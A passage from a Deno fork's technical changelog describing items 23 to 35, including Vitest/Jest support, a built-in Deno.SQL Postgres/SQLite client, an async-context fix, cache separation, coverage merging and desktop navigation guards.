    CommonJS dependencies (`Module._resolveFilename`); `moduleDirectories` /
    `modulePaths` resolve bare specifiers that name no installed package;
    `setupFiles` then `setupFilesAfterEnv` (paths or packages) are setup files;
    `testEnvironment` maps by name onto node / jsdom / happy-dom (with
    `testEnvironmentOptions`; jsdom and happy-dom resolve through the Jest
    environment package under a strict pnpm layout); `testTimeout`, `clearMocks`
    / `resetMocks` / `restoreMocks`, `injectGlobals`, `globals`,
    `snapshotSerializers`, `snapshotFormat` and `fakeTimers` (`timers`)
    configure the runtime. A `transform` other than babel-jest / ts-jest /
    `@swc/jest` / esbuild & co. (whose work Deno does) is a warning; `.js` files
    are parsed as JSX when the transform for them is babel-jest (Jest's default)
    or another JSX-capable one, else only when they do not parse as plain
    JavaScript; the JSX runtime those transformers use (`.swcrc`, the ts-jest
    tsconfig, the Babel config's text) becomes the user modules' through a new
    `EmitProgramTransform::transpile_options` override. `js/jest.js` provides
    the `jest` object on top of `vi` (fake timers with Jest's options and
    defaults: modern timers fake everything `@sinonjs/fake-timers` can on
    Node.js, `process.nextTick` and `queueMicrotask` included, which Vitest
    leaves alone, minus `doNotFake`, with the project's `fakeTimers` as the
    defaults of every `useFakeTimers()`; legacy timers fake the timer functions
    and `nextTick`; `replaceProperty`, `retryTimes`, `requireActual` /
    `requireMock` synchronously, `unstable_mockModule`, `setMock`,
    `isolateModules(Async)`, ...) and Jest's semantics: globals by default
    (`fit`, `xit`, `xdescribe`, `test.failing` too), a declared parameter of a
    test or hook is `done`, a hook's return value is not a teardown, jest-each
    titles (`%p`, `$variable`, `$#`), snapshot keys and `currentTestName` joined
    with spaces, the Jest snapshot header kept, non-strict equality ignoring
    `undefined` array items, unawaited `.resolves` not failing a test, a mock
    factory's result treated as `module.exports` (CommonJS interop), root
    `__mocks__` files mocking packages without `jest.mock()`, no `setImmediate`
    and no `Deno` on `window` in DOM environments. In a Jest project a user
    module that uses `require` gets Jest's `require()` (served by the
    transform): it resolves like an import (aliases, mocks, fresh modules after
    `jest.resetModules()`, through `op_vitest_resolve_import`) and loads ES
    modules synchronously (`op_import_sync`). For every Vitest or Jest run the
    transform also turns a TypeScript module's type-only exports into
    `undefined` value exports, so `export { SomeType } from "./types"` (valid
    without `isolatedModules`) links. The vendored runtime has four more marked
    patches for these (test name separator, `formatTitle` hook, unawaited async
    assertions, array equality).

    **Leak sanitizers** (item 157): a Vitest or Jest test is checked for leaks
    the way `deno test` is configured to check any test (deno.json's
    `test.sanitizeOps` / `test.sanitizeResources`, `--sanitize-ops` /
    `--sanitize-resources`, `DENO_TEST_SANITIZE_OPS` /
    `DENO_TEST_SANITIZE_RESOURCES`, `Deno.test.sanitizer()`). Deno checks what
    starts and finishes while a test's Deno test function runs; for a Vitest
    test that is the test with its `beforeEach` / `afterEach` / `aroundEach`
    hooks and test-scoped fixtures, plus what Vitest's runner does before it
    stops at the next test. Left out, registered with both sanitizers off (their
    leaks are not blamed on a later test either):

    - the test whose span runs the start of a suite with `beforeAll` /
      `aroundAll` hooks (the test run just before the suite's first test, or the
      file's first test when the hooks run before any), and the suite's last
      test, whose span runs its `afterAll` hooks and the end of its `aroundAll`
      hooks; setup files' hooks are the file's;
    - a test that can set up a file- or worker-scoped fixture: its function asks
      for one (directly or through another fixture) or one is `auto`; under a
      `beforeEach` / `afterEach` / `aroundEach` hook, which can ask for one too,
      every test whose `test` has one; and the file's last test when any test
      can, as its span tears them down.

    Vitest's own timers are system timers, which the sanitizers ignore (like
    `AbortSignal.timeout`'s), through `Deno[Deno.internal].vitestSystemTimers`
    and marked patches of the vendored runtime: the runner's throttled
    task-update timer, and the real timers the fake clock keeps while installed
    (the interval that advances mocked time with `shouldAdvanceTime` or tick
    mode `"interval"`, and the `"nextTimerAsync"` loop's timer). A fake timer
    never was a real one, so queued fake timers are not leaks. `.concurrent`
    tests need no exception: the bridge runs one at a time.

24. **`feat(sql)`: `Deno.SQL` / `Deno.sql`, a built-in SQL client** (`feat/sql`,
    `ext/sql`): Bun's `Bun.sql` surface over Postgres and SQLite, with no npm.
    `new Deno.SQL(url | options)` returns a tagged-template function; every
    interpolated value is sent as a parameter (`$1`... / `?1`...), never spliced
    into the text. Helpers `sql(object | objects,
    ...columns)` (by the
    keyword before them: INSERT, UPDATE ... SET, VALUES, IN, SELECT),
    `sql(array)`, `sql("identifier")`, query fragments,
    `sql.unsafe(text, params)`, `.values()`, `.raw()`, `.simple()`,
    `sql.begin([options,] fn)` (ROLLBACK on throw) with `savepoint()`,
    `sql.reserve()`, `sql.close({ timeout })` / `end()`. The pool (`max`,
    `idleTimeout`, `maxLifetime`, `connectionTimeout`, a wait queue bounded by
    the same timeout) and the builder are JavaScript (`01_sql.js`); the engines
    are Rust:
    - Postgres on `tokio-postgres` 0.7.15 (exact pins, MIT / Apache-2.0) over a
      socket the extension opens: `--allow-net` is checked for the host as named
      and for each address it resolves to; the `SSLRequest` and the rustls
      handshake are done here with the runtime's root store and
      `--unsafely-ignore-certificate-errors` (`sslmode` disable / prefer /
      require / verify-ca / verify-full,
      `tls: { ca, servername,
      rejectUnauthorized }`). One op per query
      returns every row, built directly in V8 from the binary format:
      int2/int4/float as numbers, int8/numeric as strings (`bigint: true`:
      `bigint`), json/jsonb parsed, bytea as `Uint8Array`, timestamp(tz)/date as
      `Date`, arrays, enums, domains and composites; interval / time / uuid /
      inet as the server's text. Prepared statements are cached per connection
      (`prepare: false` sends unnamed ones). Server errors are
      `SQL.PostgresError` with the SQLSTATE in `code` (and `errno`) plus
      `detail`, `hint`, `position`, `constraint`, ...; client failures carry
      `ERR_POSTGRES_*` codes.
    - SQLite (`sqlite://`, `file:`, `:memory:`, `{ adapter: "sqlite" }`) on the
      bundled rusqlite, one connection per client: read (and, unless read-only,
      write) permission for the file, `ATTACH` (and so `VACUUM
      INTO`) held
      off without full permissions as `node:sqlite` does.
    - `Deno.sql` is created on first access from `POSTGRES_URL` / `DATABASE_URL`
      / `PGURL` / `PG_URL` (env permission); `PG*` variables fill fields a
      client left out only when env access to them is already granted (no
      prompt). Typings: `cli/tsc/dts/lib.deno_sql.d.ts`.
    - Pipelining: single queries share pooled Postgres connections (up to 64 in
      flight on one, sent back to back and answered in order; tokio-postgres
      matches the responses), so a burst of queries is not bounded by `max`
      round trips at a time. Transactions, `reserve()` and cursors get a
      connection of their own. The S1 bench (`max: 4`, loopback, non-LTO
      release, against `npm:postgres` 3.4.7 on the same build): 100 concurrent
      `select 1` went from 3.2-4.8 ms to 1.4-1.7 ms (npm:postgres 1.6-1.9 ms);
      the sequential cases did not move (select 1 ~0.09-0.10 ms either way).
    - Transactions pipeline their control statements: `begin()` sends BEGIN
      without waiting for it, so it goes out with the callback's first
      statements, whose results are held until BEGIN's answer (its error wins,
      and `begin()` rejects with it even if the callback swallowed it); and when
      the callback returns its queries without awaiting them (a query or an
      array of them) COMMIT is sent right behind them. A returned statement the
      server fails aborts the transaction, so that COMMIT rolls back; one that
      fails before it is sent (a NUL, a parameter count, the builder) is flagged
      (`FLAG_GUARDED`) and `op_sql_pg_finish` sends ROLLBACK instead. BEGIN is
      pipelined only when the options are transaction modes
      (`isolation level ...`, `read only` / `read write`, `[not] deferrable`),
      since a BEGIN that failed on its syntax would leave the statements behind
      it in autocommit; other options keep the awaited BEGIN. `savepoint()` does
      the same with SAVEPOINT / RELEASE (ROLLBACK TO on failure). The statements
      of a transaction or a reserved connection (and cursors, simple queries and
      transaction ends) now go on the wire in call order even when one has to
      prepare its statement first (`FLAG_ORDERED`: a per-connection FIFO lock
      held from the op's first poll until its messages are queued; before, a
      cached statement could overtake one being prepared, which in a transaction
      could run a query ahead of its `set_config` setup). The pool's independent
      queries don't take it, so one being prepared doesn't hold back the ones
      pipelined behind it. Round trips
      (`tests/specs/sql/pg_round_trips.ts --timing`, a 10 ms each-way delay
      proxy, `delay_proxy.ts`), before → after: bare query 1 → 1; begin with 1
      returned query 3 → 1, with 1 awaited query 3 → 2; 2 returned queries 3 →
      1; 2 pipelined queries in an async callback (denext's RLS shape) 3 → 2; 2
      sequential awaited queries 4 → 3; a failing returned statement 3 → 1, a
      failing awaited one 3 → 2; a savepoint with a returned query inside an
      async transaction 5 → 2.
    - `sql.listen(channel, fn, onlisten?)` / `sql.notify(channel, payload)`:
      every channel of a client on one dedicated connection (outside `max`),
      `LISTEN "<channel>"` with the name exact; on connection loss it reconnects
      with backoff (immediately, then 100 ms doubling to 5 s), LISTENs again and
      calls `onlisten` again (notifications sent while it was down are lost).
      `unlisten()` UNLISTENs a channel with no callbacks left and closes the
      connection once nothing listens. `onnotice(notice)` receives the server's
      notices from every connection (dropped without it). The connection task
      forwards notifications and notices through a channel to
      `op_sql_pg_next_event` only when asked for.
    - Cursors: `for await (const rows of sql\`...\`.cursor(n))`and`for await
      (const row of
      sql\`...\`)`(batches of 100) read a
      server-side cursor (`DECLARE ...
      NO SCROLL CURSOR`+`FETCH FORWARD
      n`,
      unnamed statements so cursor names don't fill the statement cache) one
      batch per step of the loop, so backpressure is the loop itself; leaving
      early closes the cursor. On the pool a cursor holds a connection in a
      transaction of its own; on a reserved connection it opens one only if it
      is not in a transaction already (`25P01`from`DECLARE`).
      SQLite reads the rows first and hands them out in batches.
    - `query.cancel()` of a running Postgres query: a CancelRequest over a new
      connection to the same endpoint (same permission checks, TLS when the
      connection uses TLS), rejecting with `ERR_SQL_QUERY_CANCELLED` (the
      server's `57014` as `cause`). Each connection keeps its in-flight requests
      in wire order, and a cancel waits until its query is the one the server is
      running, so a pipelined query ahead of it is not cancelled. A query still
      waiting for a pooled connection rejects at once.
    - `sql.file(path, params)` (read permission, read when it runs),
      `sql.array(values, type)` (`$n::type[]`), Unix-socket hosts (`host=/dir`,
      `?host=/dir`, `path`; read and write permission for the socket plus
      `--allow-net` for it, as `Deno.connect` for a Unix socket; no TLS), client
      certificates (`sslcert` / `sslkey` / `sslrootcert` files or
      `tls: { cert, key }`), ranges and multiranges as
      `{ lower, upper, lowerInclusive, upperInclusive, empty }`, geometry
      (`point` `{ x, y }`, `line`, `lseg`, `box`, `path`, `polygon`, `circle`),
      `tsvector` as the server's text, and Bun's hook arguments:
      `onconnect(error | null, connection)` /
      `onclose(error | null,
      connection)` with the connection's id and
      server parameters.
    - Checked against Bun 1.3.6's `Bun.sql` on the same server (one script,
      every builtin type, parameters, result metadata, helpers via
      `current_query()`, errors). The same: row objects, `int8` / `numeric` as
      strings (`bigint: true` → `bigint`), json, arrays, enums, dates and
      `timestamptz`, uuid / inet / interval / time text, `count` / `command`,
      the INSERT / UPDATE / IN / identifier helpers (whitespace aside),
      transactions and savepoints, `reserve()`,
      `ERR_POSTGRES_CONNECTION_CLOSED`. Kept different on purpose: `code` is the
      SQLSTATE (as in postgres.js; Bun puts `ERR_POSTGRES_SERVER_ERROR` /
      `_SYNTAX_ERROR` there and the SQLSTATE in `errno`, which we also set),
      `position` is a number; `count` / `command` are non-enumerable (Bun's
      print with the rows) and there is no `affectedRows`; `bytea` is a
      `Uint8Array` (Bun: `Buffer`); ranges, geometry and anonymous records are
      objects / arrays (Bun: the server's text) and `money` has no currency
      sign; `±infinity` timestamps are strings (Bun: an Invalid Date); `void` is
      `null`; parameters are typed by the server (unspecified OIDs), so an
      uncast `${42}` in a select list comes back as the text `"42"` (Bun types
      numbers and booleans itself), while `${[1, 2]}::int4[]`, objects (JSON,
      Bun sends `[object Object]`), `Date`s (ISO, Bun sends `Date.toString()`)
      and arrays bound to text work; `sql([])` after IN is `(null)` (Bun: a
      syntax error); `sql(names)` after SELECT and `VALUES` rows, arrays of
      fragments work (Bun rejects them); `.simple()` values are the server's
      text and `.raw()` cells its binary form (Bun parses simple results and
      gives text-format raw cells); `cancel()` before a query starts rejects it
      (Bun's never settles); a refused connection is
      `ERR_POSTGRES_CONNECTION_FAILED` (Bun: `_CONNECTION_CLOSED`); an uncast
      parameter takes the type the server infers (`select ${42}` is `"42"`),
      which is more forgiving than Bun's client-side typing (`text_col = ${42}`
      works). Aligned: booleans bound where the server expects a number
      (`${true}::int`) are sent as `1` / `0`, and as `true` / `false` where it
      expects text; `onconnect` / `onclose` take the error (or `null`) first;
      `timestamp` without a time zone is local wall-clock time both ways, as in
      Bun, postgres.js and node-postgres: read as `new Date(y, m, d, h, ...)`
      would (a time the clock skipped uses the offset from before the change,
      one it passed twice the earlier instant), and a `Date` is sent as local
      time with its UTC offset (`2024-01-15T12:00:00.000-06:00`, which a
      `timestamptz` reads as the same instant); `date` stays UTC midnight both
      ways. The offsets come from the runtime's own `Date` (so `TZ` applies).
    - Not yet: MySQL, the `"bun"` module, `tsquery` decoding.

25. **`fix(core)`: a first-time `import()` no longer leaks the importer's async
    context** (`fix/als-dynamic-import`, `libs/core/modules/map/dynamic.rs`).
    `ModuleMap::dynamic_import_module_evaluate` (and the `import.defer` path)
    installed the importer's continuation-preserved embedder data
    (AsyncLocalStorage / AsyncContext) to evaluate a newly loaded module and
    never put the previous value back. The importer's context stayed the
    isolate's ambient one, so the next task the runtime started on its own
    inherited it: the next `Deno.serve` handler saw the previous request's
    `als.getStore()`, the test runner's next test saw the last test's store.
    Only a module not loaded before took that path (plain, top-level await,
    JSON, Wasm); cached imports resolve without it. The module's top-level code
    still runs in the importer's context, as in Node (checked against Node
    24.18: top level, after a top-level `await` and its timers see the store;
    the next `http` request does not). Tests:
    `dyn_import_restores_async_context` in `libs/core/modules/tests.rs` and
    `tests/specs/node/async_local_storage_dynamic_import` (the next `Deno.serve`
    request and the next `deno test` test).

26. **`ci(release)`: this fork's own `deno` CLI is a release asset** (from
    `denext.15`; `.github/workflows/denext_runtime.yml` job `cli`,
    `.github/denext-runtime/assemble_cli.sh` / `cli_smoke.sh`,
    `cli/lib/version.rs`, `cli/standalone/binary.rs`). Every runtime release
    also carries `deno-cli-<version>-<target>.zip` for the same targets, built
    with `cargo build --release --locked --bin deno`, so denext can download the
    CLI features (items 23, 24, and the CLI-side parts of the rest) pinned by
    version and SHA-256 like the runtime, with nothing else to install. The
    binary is still `deno`. A release build bakes `DENEXT_VERSION` (the release
    version, e.g. `3.0.0-rc.1`; `2.9.7-denext.15` before the fork took its own
    version, see [Versioning](#versioning)) in at compile time: it becomes
    `Deno.version.deno`, `deno --version` / `deno -V`
    (`deno 3.0.0-rc.1 (stable, release, <target>)`) and the user agent
    (`Deno/3.0.0-rc.1`), and marks the build as denext's. The `libdenort`
    download of `deno desktop` (and `denort` when the build is not denext's)
    keeps the upstream version (`UPSTREAM_DENO_VERSION`, `2.9.8`), and
    `deno upgrade` refuses to run. A value that is not the build's own version
    or does not extend it with `-` or `+` is ignored (the `libdenort` build sets
    none). Each archive is smoke-tested on its own runner (the version lines and
    `Deno.version.deno`, `typeof Deno.SQL === "function"`, a Vitest suite
    passing under `deno test`) and attested. Tests:
    `denext_version_is_or_extends_the_deno_version` in `cli/lib/version.rs`, and
    item 79's.

27. **Upstream fixes taken ahead of a Deno bump** (from `denext.16`), each
    cherry-picked from denoland/deno `main` with `-x` (the commit message names
    the upstream commit). All of them shipped in upstream 2.9.8, so since the
    [2.9.8 sync](#upstream-syncs) the fork carries upstream's commits and this
    item records only when they arrived:
    - `fix(compile)`: a compiled program checks the read permission for a local
      file it imports dynamically (denoland/deno#36925, a security fix).
    - `fix(ext/napi)`: `napi_create_dataview` checks its bounds for overflow
      (#36962); a callback's return value is ignored while an exception is
      pending (#36942).
    - `fix(coverage)`: the V8 code cache is skipped while collecting coverage,
      so a module loaded from it is not reported as fully covered (#36901).
    - `fix(ext/fetch)`: hyper 1.11.1 / hyper-util 0.1.21 cancel the connection
      pool's idle interval once the pool is empty (#36968).
    - `fix`: rand 0.9.3 (GHSA-cq8v-f236-94qc), for ext/sql's Postgres client
      (`postgres-protocol`, `tokio-postgres`) too.

28. **`fix(cache)`: caches of their own** (from `denext.17`;
    `feat/toolchain-cache-and-types`, CLI only;
    `libs/resolver/cache/deno_dir.rs`, `cli/node_compat_shim.rs`). denext runs
    this CLI as its managed toolchain next to a stock `deno`, both on one
    DENO_DIR, so the downloads are shared. But every SQLite cache in it is wiped
    whenever a CLI of another version opens it
    (`CacheDBConfiguration::on_version_change`, the version being
    `2.9.7-denext.N` here and `2.9.7` there), so alternating the two binaries
    threw both one's type-check results and the rest away on every switch: on
    denext's own `deno check mod.ts cli.ts src/server/mod.ts` a check warm at
    4.6 s took 52 s again after each switch. The fork now keeps its own copy of
    each version-keyed cache, named with a `_denext` suffix
    (`DENEXT_CACHE_SUFFIX`): `check_cache_v2_denext`, `v8_code_cache_v2_denext`,
    `fast_check_cache_v2_denext`, `dep_analysis_cache_v2_denext`,
    `node_analysis_cache_v2_denext`, `fmt_incremental_cache_v2_denext` and
    `lint_incremental_cache_v2_denext` (plus their `-wal` / `-shm` files). Its
    `node` shim directory is `node_compat_bin_denext`: each binary points the
    shim at itself, so a shared one was re-pointed on every switch and a `node`
    spawned by one could run the other. What stays shared is keyed by content:
    `remote/`, `npm/`, `registries/`, `dl/`, `location_data/` and the emits in
    `gen/` (keyed by the source, the transpile options and the `deno_ast`
    version, which both builds share; a module the Vitest transform changes is
    emitted under another key, so its emit is the one exception the two builds
    overwrite). `deno clean` removes both copies. Tests:
    `version_keyed_caches_are_the_forks_own` in
    `libs/resolver/cache/deno_dir.rs`; the integration tests that inspect the
    type-check and code caches (`tests/integration/jsr_tests.rs`,
    `run_tests.rs`) open the new files.

29. **`feat(test)`: types for the built-in `vitest` and `@jest/globals`** (from
    `denext.17`; `feat/toolchain-cache-and-types`, CLI only;
    `cli/tools/test/vitest/types/`, `cli/tools/check.rs`, `cli/lsp/resolver.rs`,
    `cli/module_loader.rs`, `cli/graph_container.rs`). The declarations item 23
    serves for `vitest` / `vite-plus/test` / `@jest/globals` when the package
    itself is not installed typed `vi`, `expect` and `jest` as `any`, so
    `vi.mock()` factory parameters and mocks needed explicit types under a
    strict check. They now describe the surface the vendored runtime implements:
    `vi` (`fn`, `spyOn` with its `get` / `set` forms, `mocked`, `mockObject`,
    `when`, `mock` / `doMock` with a typed `importOriginal`, the
    `vi.mock(import("./x"), factory)` form typing the factory's result against
    the module, `hoisted`, `importActual` / `importMock`, `resetModules`, the
    fake timers, `stubGlobal` / `stubEnv`, `waitFor` / `waitUntil`,
    `setConfig`), `Mock` / `MockInstance` / `MockContext` / `Mocked*` /
    `MaybeMocked*`, `expect` (Jest's matchers and Vitest's own, chai's chains
    and flags, the asymmetric matchers, `resolves` / `rejects`, `soft`, `poll`,
    `extend`, `assertions`), `describe` / `it` / `test` with `skip`, `only`,
    `todo`, `concurrent`, `fails`, `shuffle`, `skipIf` / `runIf`, `each` (array
    rows spread, tuples typed, template tables) and `for`, fixtures
    (`test.extend` in its object and builder forms, `override`), the hooks and
    `TestContext`; and for `@jest/globals` Jest's test API (a declared parameter
    is the `DoneCallback`, `test.failing`, `fit` / `xit` / ...) and the `jest`
    object, with `jest.Mock` / `jest.Mocked` / `jest.SpiedFunction` & co. as
    types. Chai's `assert` / `should` and `expectTypeOf` stay `any`. Custom
    matchers are typed by augmenting the module, as with Vitest: a
    `declare module "vitest"` block adding to `interface Matchers<T>` (or
    `interface Assertion<T>`). `vitest/globals` (an empty module at runtime) has
    its own types: the globals a `globals: true` config installs (Vitest's
    `globalApis`: `describe`, `it`, `expect`, `vi`, the hooks, ...), for
    `/// <reference types="vitest/globals" />` or `compilerOptions.types`.
    `vitest/importMeta` gets none: the runtime does not implement in-source
    testing (`import.meta.vitest`, `includeSource`). The types are written to
    `<DENO_DIR>/vitest_compat/v7/` (the version bumped, so older copies are not
    reused). An installed package's own types still take precedence (the
    override is a fallback for a bare specifier; an `npm:` specifier is never
    installed just for its types). `deno check` now installs the same type
    overrides (`vitest::install_type_overrides`, unless the workspace sets
    `test.vitestCompat: false`), so a Vitest or Jest file checks against the
    same declarations under `deno check` as under `deno test` (before,
    `deno check` reported `Import "vitest" not a dependency`); only the built-in
    modules' types, as the config's aliases and Vite's resolution are
    `deno test`'s. The LSP installs them too (`vitest::lsp_type_overrides`, per
    scope, with the same `test.vitestCompat: false` opt-out), so an editor
    resolves `vitest` without the package; as it runs nothing, there a built-in
    module resolves to its types for code as well
    (`VitestOverrides::types_only`). In a project with a Vitest or Jest config,
    `deno test` used to type-check only the config: loading it (before the test
    modules are known) added it to the module graph, and the graph is
    type-checked only on its first load, so a test module with a type error ran.
    The test modules (and their graph) are now type-checked like without a
    config, once: the check of the test modules is forced
    (`CheckSpecifiersOptions::force_type_check` /
    `PrepareModuleLoadOptions::force_type_check`) and covers only the new roots,
    as the config was checked when it loaded, in a graph of their own: running
    the config pruned the types from the shared graph, which left it code only,
    so test modules added to it kept no type dependencies (a `vitest/globals`
    type reference or an `import type` went unresolved). `--no-check` and the
    check settings apply as usual. For that check, Vite's CSS, asset, `?raw`,
    `?url`, `?inline` and `?worker` imports resolve to types as Vite's client
    types declare them (a `string`, a CSS module's class map, a worker
    constructor). Tests: `tests/specs/test/vitest` `types_*` (a fully typed
    suite, with no annotation on any factory, mock or fixture, passing under
    `deno test` and `deno check`; a Jest one; wrong uses reported as type errors
    by both; an installed `vitest`'s own types winning; a `globals: true`
    project typed by `vitest/globals` under `deno test` and `deno check`; custom
    matchers through module augmentation; a config project whose test module has
    a type error failing, and running with `--no-check`),
    `types_of_builtin_modules` in `cli/tools/test/vitest/mod.rs`, and
    `lsp_vitest_builtin_types` / `lsp_vitest_builtin_types_disabled` in
    `tests/integration/lsp_tests.rs`.

30. **`feat(bundle)`: the CLI archive ships esbuild, and `deno bundle` uses it**
    (from `denext.17`; `feat/bundled-esbuild`; `cli/tools/bundle/esbuild.rs`,
    `.github/denext-runtime/fetch_esbuild.py`, `assemble_cli.sh`,
    `cli_smoke.sh`, `manifest.py`). Each `deno-cli-*` zip (item 26) carries,
    beside `deno`, the official esbuild `ESBUILD_VERSION` (0.25.5) binary for
    its target (`esbuild`, `esbuild.exe` on Windows) and esbuild's MIT license
    (`esbuild.LICENSE`). The release workflow takes it from the
    `@esbuild/<platform>` npm tarball (the license from the `esbuild` package of
    the same version), each pinned in `fetch_esbuild.py` by URL and npm
    `dist.integrity`: the registry's current packument must still say the same,
    and the downloaded bytes must hash to it. `BUILD_INFO.json` records the
    source tarball, integrity and binary SHA-256, and `manifest.json` lists
    `esbuild: { version, sha256 }` under each CLI target. `deno bundle` then
    looks for an esbuild before downloading one into `DENO_DIR`: first
    `DENO_ESBUILD_BINARY` (an explicit path; used even at another version, with
    a warning; an error if it is not a file), then an `esbuild[.exe]` next to
    the running `deno` executable, used only when its `--version` is exactly
    `ESBUILD_VERSION`. A sibling of another version, or none, leaves upstream's
    download path as it was. So neither `deno bundle` nor denext's build (which
    uses the same CLI) fetches esbuild from npm. Upstream has no such override.
    Tests: the `local_esbuild` unit tests in `cli/tools/bundle/esbuild.rs`;
    `tests/integration/bundle_tests.rs` (a copy of `deno` with the pinned
    esbuild beside it bundles with an empty `DENO_DIR` and an unreachable npm
    registry and downloads nothing; a wrong-version sibling is ignored;
    `DENO_ESBUILD_BINARY` works offline); `cli_smoke.sh` checks
    `esbuild --version` and an offline `deno bundle` from every unpacked release
    zip.

31. **`fix(test)`: coverage of a module run both with and without the Vitest
    transform** (from `denext.17`; `fix/vitest-coverage-merge`, CLI only). A
    module run by a plain `deno test` and by a Vitest one (item 23) runs as two
    different emits: the transform makes every user module's exports mutable
    (export setters appended, `const` exports made `let`), stubs type-only
    exports, hoists `vi.mock()`, and hides `Deno` in a Vitest or Jest project.
    Their profiles did not merge: the emit cache held one emit per module, so
    the later run's emit replaced the other's and `deno coverage` reported
    "Missing transpiled source" for, or misread, the other run's profiles; and
    `deno coverage` merged the profiles of one URL range by range, offsets into
    two different scripts, so a module covered 91.9% by plain tests and 30.8% by
    Vitest ones read 38.9%.

    Emitting only the modules that need setters untransformed is not possible:
    `vi.spyOn(namespace, "export")` reaches any module whose namespace a test
    obtains (an `import * as`, a dynamic `import()`, `vi.importActual()`, a
    namespace handed through a helper), which is not known when a module is
    emitted, so Vitest itself (`vite-node`'s SSR transform) instruments every
    module; and the `Deno` shadowing and type export stubs change the emit
    regardless. So:

    - The emit cache keeps a module's transformed emit apart from its plain one
      (`<file>.transformed.js` beside `<file>.js` in `gen/`): an emit with a
      program transform key (`EmitProgramTransform::cache_key`) is read and
      written through `EmitCache::{get,set}_transformed_emit_code`, and
      `deno
      coverage` reads it with
      `Emitter::maybe_cached_transformed_emit_any_source_hash` (which replaces
      item 23's `maybe_cached_emit_any_source_hash`). A plain run no longer
      evicts the Vitest run's emit, nor the other way round.
    - `deno coverage` sorts each module's profiles by the form of its code they
      were taken of (the plain source or emit, or the transformed emit: the one
      whose length is that of the script V8 ran, else the plain one, as for a
      CommonJS module V8 ran wrapped), merges the profiles of one form range by
      range as before, and makes a report of each form through that form's own
      source map. The reports of the forms then merge in terms of the original
      source (`merge_reports` in `cli/tools/coverage/mod.rs`): a line's,
      function's (by name and line) and branch's counts are summed and anything
      in only one report is kept, so the merged line coverage is the union of
      the runs'. Branches are matched by the function they are in (`BlockKey`:
      the top-level code, or a function's original line, name and rank) and keep
      the first report's block numbers. A branch one form's report lacks is one
      whose range V8 left out of that profile, as it does a block that ran as
      often as the code around it; there its arm counts as often as the first
      line of code of its range ran in that form
      (`BranchCoverageItem::content_line_index`), and the implicit complement of
      a single range never. Merged, a module can list a branch at both the `if`
      and the code after it where one process running both would list only one
      of them.

    `deno test --coverage=<dir>` empties `<dir>` first unless
    `--coverage-raw-data-only` is given (without `--clean`), as upstream; that
    is unchanged. To combine runs, give each `--coverage-raw-data-only` and
    report the directory with `deno coverage <dir>` (or several directories with
    `deno coverage <dir1> <dir2>`). Covered by
    `tests/specs/test/vitest/coverage_mixed` (a plain test and Vitest tests
    covering complementary halves of one module, a module mocked in one run and
    real in another, both run orders with their own emit caches: the merged lcov
    is the union, line for line) and unit tests in `cli/tools/coverage/mod.rs`
    and `libs/resolver/cache/emit.rs`.

32. **`feat(desktop)`: the navigation guard** (from `denext.18`;
    `feat/desktop-navigation-guard`, laufey API 48). A top-level navigation in
    an app window to an origin other than the app's (a link, `location = …`, a
    form, a server redirect, `window.open()` / `target="_blank"`) never loads in
    the window: laufey cancels it and opens an `http(s)` destination in the
    system browser through its checked open-external path, on CEF
    (`OnBeforeBrowse`), WKWebView (`decidePolicyForNavigationAction`), WebView2
    (`NavigationStarting`) and WebKitGTK (the main frame's response policy; its
    navigation policy names no frame, so a refused response is ignored, after
    its request is sent). Sub-frames stay the page's CSP's. A window may load
    the origin the runtime navigated it to; at startup the runtime also allows,
    for every window, the app origin, a development run's dev server and the
    embedded app.json's new `allowedNavigationOrigins` (exact origins,
    normalized; `parse_app_config_file` refuses a wildcard, a path, a query or
    credentials, as it refuses an unknown key). Covered by unit tests in
    `cli/lib/standalone/app_origin.rs`, `cli/rt_desktop/app_origin.rs` and
    `cli/rt_desktop/lib.rs`, and by laufey's `navigation_guard_test` and
    native-e2e `--navigation` on every web-engine backend.

33. **`fix(core)`: the op contexts outlive the isolate; `deno lint` joins its
    plugin host** (from `denext.19`; `fix/core-opctx-outlives-isolate`,
    cherry-picked unchanged from f73f713, offered upstream as
    [denoland/deno#37026](https://github.com/denoland/deno/pull/37026) for
    [#37025](https://github.com/denoland/deno/issues/37025); runtime and CLI).
    V8 150.x keeps the raw `CFunction` pointers of every fast-call template
    (`OpCtx::fast_fn_overloads`) in `FunctionTemplateInfo`, and a concurrent
    TurboFan job that inlines a fast-API call reads them until the isolate is
    disposed. Dropping a runtime freed the realm's op contexts first
    (`JsRealmInner::destroy()` before `ManuallyDrop::drop(v8_isolate)`), so a
    job still compiling read freed memory: about 2% of `deno lint` runs with a
    lint plugin under load ended in a SIGSEGV at exit, in stock 2.9.6 / 2.9.7
    too. `destroy()` now hands the op contexts back and `InnerIsolateState`
    drops them after disposing of the isolate; `deno lint` waits (bounded) for
    its plugin host thread instead of detaching it. Covered by
    `op_ctxs_outlive_isolate` (`libs/core/runtime/tests/misc.rs`) and the spec
    `tests/specs/lint/lint_plugin_shutdown`. Upstream merged #37026 unchanged
    and shipped it in 2.9.8 (a36142b28c); since the
    [2.9.8 sync](#upstream-syncs) this is upstream's fix and the fork carries
    nothing of its own here.

34. **`feat(desktop)`: delivered notifications, destructive menu items, the
    share sheet, Handoff and Spotlight** (from `denext.20`, laufey API 49):
    `Deno.desktop.notifications.getDelivered()` / `removeDelivered(tags?)`
    (macOS `UNUserNotificationCenter`, Windows' toast history;
    `capabilities().delivered`); a menu item's `destructive: true` (red on
    macOS, WebKitGTK and CEF's Views menus; `menuCapabilities().destructive`);
    `BrowserWindow.share({ title, text, url, files })` (macOS
    `NSSharingServicePicker`, Windows `DataTransferManager`; files need read
    permission); `Deno.desktop.userActivity.set()` / `clear()` / `onContinue()`
    (macOS `NSUserActivity`). Covered by the menus and window e2e areas and
    laufey's unit tests and native-e2e.
35. **laufey `integration/denext20` host changes** (from `denext.20`, no runtime
    API): the navigation guard's per-window budget of browser opens (3 a
    second); the Windows CEF host's proxy warm-up and `"proxy"` launch setting
    (`LAUFEY_PROXY`: `system`, `direct`; WinHTTP per-request resolution was
    dropped: under a 12 s PAC file the relay WebSocket waited 11.7 s with
    `system`, 14 ms with `direct`, and timed out at 45 s with it); a team-signed
    macOS CEF app's cookie key in a keychain item of its own
    (`"<app id> Safe Storage"`, the mock-keychain profile migrated; the
    `SecItem*` interposers ship as
    `Contents/MacOS/liblaufey_keychain_interpose.dylib`, which the packaging
    signs with the other Mach-O files there); the CEF hosts waiting for the
    profile's LevelDB LOCK files before `CefInitialize` and for their helpers
    after `CefShutdown` (only `--type=` children: not the zygotes, which had
    added 5 s to every quit on Linux, the crash handler or the app's own
